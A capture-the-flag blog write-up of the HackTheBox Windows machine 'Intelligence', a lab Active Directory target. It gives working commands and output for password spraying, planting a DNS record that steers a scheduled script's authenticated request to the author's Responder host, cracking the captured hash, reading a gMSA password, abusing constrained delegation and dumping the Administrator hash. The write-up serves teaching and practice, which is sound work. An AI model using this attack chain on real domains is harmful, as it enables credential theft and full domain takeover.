---
title: "HackTheBox - Intelligence"
author: Nasrallah
description: ""
date: 2025-10-07 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, ad, activedirectory, dns, powershell, ]
img_path: /assets/img/hackthebox/machines/intelligence
image:
    path: intelligence.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Intelligence](https://app.hackthebox.com/machines/intelligence) is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.248
Host is up (0.15s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0             
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods:       
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-01 20:43:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC           
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-01T20:45:00+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16           
|_Not valid after:  2022-04-19T00:43:16
445/tcp  open  microsoft-ds?       
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-01T20:45:01+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-01T20:45:00+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-01T20:45:01+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2025-08-01T20:44:24
|_  start_date: N/A
```

The machine is an Active Directory Domain Controller, the domain name is `intelligence.htb` and the hostname of the Domain Controller is `dc.intelligence.htb`, let's add both of them to the hosts file.

### Web

There is an microsoft IIS server on port 80 so let's check it out.

![web](1.png)

If we scroll down we see that we can open some pdf files.

![pdf](2.png)

There are two pdf and they share the same naming convention: `2021-03-18-upload.pdf` `yyyy-mm-dd-upload.pdf`.

I'll download one of the pdf and check it's metadata using `exiftool`.

```terminal
[★]$ exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.57
File Name        : 2020-01-01-upload.pdf
Directory        : .
File Size        : 27 kB
File Modification Date/Time     : 2021:04:01 18:00:00+01:00
File Access Date/Time           : 2025:08:01 15:00:39+01:00
File Inode Change Date/Time     : 2025:08:01 15:00:39+01:00
File Permissions : -rw-r--r--
File Type        : PDF
File Type Extension             : pdf
MIME Type        : application/pdf
PDF Version      : 1.5
Linearized       : No
Page Count       : 1
Creator          : William.Lee
```

The pdf contains a creator name(William.Lee). The same applies to the other pdf.

Maybe there are other pdf files in the website we just need to find their name.

I'll use the following bash script to create a list of filenames from 2019 to 2022

```bash
#!/bin/bash
start="2019-01-01"
end="2022-12-31"

current="$start"
while [ "$(date -d "$current" +%Y-%m-%d)" != "$(date -d "$end +1 day" +%Y-%m-%d)" ]; do
    echo "$current"
    current=$(date -d "$current +1 day" +%Y-%m-%d)
done

```

Now I'll fuzz for the files.

```terminal
[★]$ ffuf -c -w ./list.txt -u 'http://intelligence.htb/documents/FUZZ-upload.pdf'
          
        /'___\  /'___\           /'___\ 
       /\ \__/ /\ \__/  __  __  /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\ 
          \/_/    \/_/   \/___/    \/_/ 
          
       v2.1.0-dev        
________________________________________________       
          
 :: Method           : GET
 :: URL              : http://intelligence.htb/documents/FUZZ-upload.pdf
 :: Wordlist         : FUZZ: /home/sirius/ctf/htb/intelligence/list.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

2020-01-20              [Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 312ms]
2020-01-23              [Status: 200, Size: 11557, Words: 167, Lines: 136, Duration: 369ms]
2020-01-30              [Status: 200, Size: 26706, Words: 242, Lines: 193, Duration: 416ms]
[...]
```

There are a lot a files, I'll save the output to a file instead.

```bash
ffuf -w ./list.txt -u 'http://intelligence.htb/documents/FUZZ-upload.pdf' -o out.txt
```

FFUF save the output in a json format, so I'll use the following command to filter for the found dates only.

```bash
jq -r '.results[].input.FUZZ' out.txt > dates.txt
```

We got a list of pdf file names, I'll use the following bash command to download the files.

```bash
while read date; do
    wget "http://intelligence.htb/documents/${date}-upload.pdf"
done < dates.txt
```

```terminal
[★]$ bash download.sh
[SNIP]
[★]$ ls
2020-01-01-upload.pdf  2020-02-28-upload.pdf  2020-05-07-upload.pdf  2020-06-14-upload.pdf  2020-08-01-upload.pdf  2020-09-27-upload.pdf  2020-12-10-upload.pdf  2021-02-25-upload.pdf
[SNIP]
2020-01-30-upload.pdf  2020-04-04-upload.pdf  2020-06-03-upload.pdf  2020-07-02-upload.pdf  2020-09-06-upload.pdf  2020-11-10-upload.pdf  2021-01-25-upload.pdf  dates.txt
2020-02-11-upload.pdf  2020-04-15-upload.pdf  2020-06-04-upload.pdf  2020-07-06-upload.pdf  2020-09-11-upload.pdf  2020-11-11-upload.pdf  2021-01-30-upload.pdf  download.sh

```

We download a lot of files.

Now I'll use `exiftool` to save the metadata of the pdfs to a file.

```bash
exiftool *.pdf > results.txt
```

Now I'll filter the results to only get the usernames.

```bash
cat results.txt | grep Creator | tr -s " " | awk '{print $3}' > users.txt
```

We got a list of usernames.

Now I'll work on the pdf. It's going to be a lot of work to check each pdf manually for information. Instead, I'll use `pdftotext` to convert the pdf to text files and then grep for any useful information.

```bash
mkdir textfiles
for file in *.pdf; do
    pdftotext "$file" textfiles/"${file%.pdf}.txt"
done
```

This script will create create text version of the pdf files and save them to a directory named `.textfiles`.

```terminal
[★]$ bash convert.sh
[★]$ cd textfiles
[★]$ ls                                       
2020-01-01-upload.txt  2020-02-28-upload.txt  2020-05-07-upload.txt  2020-06-14-upload.txt  2020-08-01-upload.txt  2020-09-27-upload.txt  2020-12-10-upload.txt  2021-02-25-upload.txt
2020-01-02-upload.txt  2020-03-04-upload.txt [SNIP]
```

Now I'll grep for the word password.

```terminal
[★]$ grep -Ri 'password' ./
./2020-06-04-upload.txt:Please login using your username and the default password of:
./2020-06-04-upload.txt:After logging in please change your password as soon as possible.
```

One file seems to have that word is `2020-06-04-upload.txt`, here is the content of it.

```terminal
[★]$ cat 2020-06-04-upload.txt
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

We got the password, now let's spray it using the users list we got earlier.

```terminal
[★]$ nxc smb intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876'
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domin:intelligence.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
[SNIP]
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

We got a hit on `Tiffany.Molina`

Let's list shares now.

```terminal
[★]$ nxc smb intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domin:intelligence.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ  
```

We got read permission on the IT share, let's connect to it using `smbclient`.

```terminal
[★]$ smbclient //intelligence.htb/it -U Tiffany.Molina%'NewIntelligenceCorpUser9876'                 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 00:50:55 2021
  ..                                  D        0  Mon Apr 19 00:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 00:50:55 2021

                3770367 blocks of size 4096. 1447262 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \> exit
```

I found a powershell script called downdetector.ps1, let's check it out.

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

First thing to notice is that this script is running every 5 min.

This script queries the DNS record for any subdomains that starts with `web`, then makes a web request to it with credentials `-UseDefaultCredentials`.

### DNS

I'll use `dnstool.py` from [krbrelayx](https://github.com/dirkjanm/krbrelayx) to add a record that points to my machine.

```bash
python dnstool.py -u 'intelligence.htb\tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webattack' -d '10.10.16.88' -t A dc.intelligence.htb
```

```terminal
[★]$ python dnstool.py -u 'intelligence.htb\tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webattack' -d '10.10.16.88' -t A dc.intelligence.htb                              
[-] Connecting to host...
[-] Binding to host      
[+] Bind OK              
Traceback (most recent call last):                                                                                                                                                            
  File "/home/sirius/ctf/htb/intelligence/krbrelayx/dnstool.py", line 615, in <module>                                                                                                        
    main()
  File "/home/sirius/ctf/htb/intelligence/krbrelayx/dnstool.py", line 537, in main   
    record = new_record(addtype, get_next_serial(args.dns_ip, args.host, zone,args.tcp))            
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^             
  File "/home/sirius/ctf/htb/intelligence/krbrelayx/dnstool.py", line 256, in get_next_serial       
    res = dnsresolver.resolve(zone, 'SOA',tcp=tcp)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1190, in resolve
    (request, answer) = resolution.next_request()
         ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 691, in next_request
    raise NXDOMAIN(qnames=self.qnames_to_try, responses=self.nxdomain_responses)
dns.resolver.NXDOMAIN: The DNS query name does not exist: intelligence.htb.
```

I got an error saying that `intelligence.htb` doesn't exist. To fix it I'll add the ip address of the machine to `/etc/resolv.conf` on my machine.

```terminal
[★]$ cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver 10.10.10.248
nameserver 192.168.214.2
```

Now I'll run the command again.

```terminal
[★]$ python dnstool.py -u 'intelligence.htb\tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webattack' -d '10.10.16.88' -t A dc.intelligence.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

I'll run responder and wait for the web request.

```terminal
[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.129.95.154
[HTTP] GET request from: ::ffff:10.129.95.154  URL: / 
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:37dd4ea20ef0ac8a:1F531D40DF74DF518830237CA33138DF:01010000000000004624961D2536DC016DA9D255CA23DDF60000000002000800420048005100380001001E00570049004E002D004300340048005700410055004500530052004B0044000400140042004800510038002E004C004F00430041004C0003003400570049004E002D004300340048005700410055004500530052004B0044002E0042004800510038002E004C004F00430041004C000500140042004800510038002E004C004F00430041004C00080030003000000000000000000000000020000013B3D2E31493B51824E5E7376835635E5946325C8A7CE5663907CE2D3EF1BA560A0010000000000000000000000000000000000009003E0048005400540050002F00770065006200610074007400610063006B002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

We got the hash of user `Ted.Graves`

```terminal
[★]$ hashcat hash /usr/share/wordlists/rockyou.txt -m 5600                                                                                                                                
hashcat (v6.2.6) starting

Dictionary cache hit:                                                                                                                                                                         
* Filename..: /usr/share/wordlists/rockyou.txt                                                                                                                                                
* Passwords.: 14344385                                                                                                                                                                        
* Bytes.....: 139921507                                                                                                                                                                       
* Keyspace..: 14344385 

TED.GRAVES::intelligence:37dd4ea[SNIP]000000:Mr.Teddy
```

We got ted's password.

### Bloodhound

I'll use `netexec` to collect information about the domain for bloodhound.

```terminal
[★]$ nxc ldap dc.intelligence.htb -u tiffany.molina -p 'NewIntelligenceCorpUser9876' --bloodhound --collection all --dns-server 10.10.10.248                                              
LDAP        10.10.10.248    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:Never)                       
LDAP        10.10.10.248    389    DC               [+] intelligence.htb\tiffany.molina:NewIntelligenceCorpUser9876                                                                           
LDAP        10.10.10.248    389    DC               Resolved collection methods: session, trusts, objectprops, dcom, group, acl, rdp, psremote, container, localadmin                         
LDAP        10.10.10.248    389    DC               Done in 0M 31S                                                                                                                            
LDAP        10.10.10.248    389    DC               Compressing output into /home/sirius/.nxc/logs/DC_10.10.10.248_2025-08-01_153542_bloodhound.zip 
```

I uploaded the zip file to bloodhound and listed the outbound object control of user ted.graves and found the following:

![bloodhound](3.png)

The user ted.graves and read gmsa password of `svc_int$`.

We can use the netexec module `gmsa` to get the ntlm hash of the service account.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-08-01 16:13]-[~/ctf/htb/intelligence]                                                                                                                   
└──╼[★]$ nxc ldap dc.intelligence.htb -u ted.graves -p 'Mr.Teddy' --gmsa                                                                                                                      
LDAP        10.10.10.248    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:Never)                       
LDAP        10.10.10.248    389    DC               [+] intelligence.htb\ted.graves:Mr.Teddy   
LDAP        10.10.10.248    389    DC               [*] Getting GMSA Passwords                 
LDAP        10.10.10.248    389    DC               Account: svc_int$             NTLM: a9f4721de917a40fd9010ad815708184     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport'] 
```

Back to bloodhound we can see that `svc_int$` has constrained delegation permission over the domain controller.

![cd](4.png)

### Constrained Delegation

> If a service account, configured with constrained delegation to another service, is compromised, an attacker can impersonate any user (e.g. domain admin, except users protected against delegation) in the environment to access another service the initial one can delegate to.

Let's request a ticket on as the domain controller `DC$`

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-08-01 23:19]-[~/ctf/htb/intelligence]
└──╼[★]$ getST.py -spn 'WWW/dc.intelligence.htb' -impersonate 'DC$' -hashes :a9f4721de917a40fd9010ad815708184 'intelligence.htb/svc_int$'
[-] CCache file is not found. Skipping...                                                                                                                                                     
[*] Getting TGT for user                                                                                                                                                                      
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Got the clock issue, we can easily fix it using the following command:

```terminal
[★]$ sudo rdate -n intelligence.htb                                                                                                                                                       
[sudo] password for sirius:                                                                                                                                                                   
Fri Aug  1 23:18:53 +01 2025
```

Now let's rerun the command:

```terminal
[★]$ getST.py -spn 'WWW/dc.intelligence.htb' -impersonate 'DC$' -hashes :a9f4721de917a40fd9010ad815708184 'intelligence.htb/svc_int$' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
                                                                                                                                                                                              
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC$ 
[*] Requesting S4U2self                                                                        
[*] Requesting S4U2Proxy
[*] Saving ticket in DC$@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

We got the dc's TGS, let's use it to dump the administrator's hash using `secretsdump`.

```terminal
[★]$ KRB5CCNAME='DC$@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache' secretsdump.py -k dc.intelligence.htb -just-dc-user administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
Administrator:des-cbc-md5:2362bc3191f23732
[*] Cleaning up...
```

Now we can use the administrator NT hash to get a shell using `evil-winrm`.

```terminal
[★]$ evil-winrm -i intelligence.htb -u administrator -H 9075113fe16cf74f7c0f9b27e882dad3
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## **References**

<https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
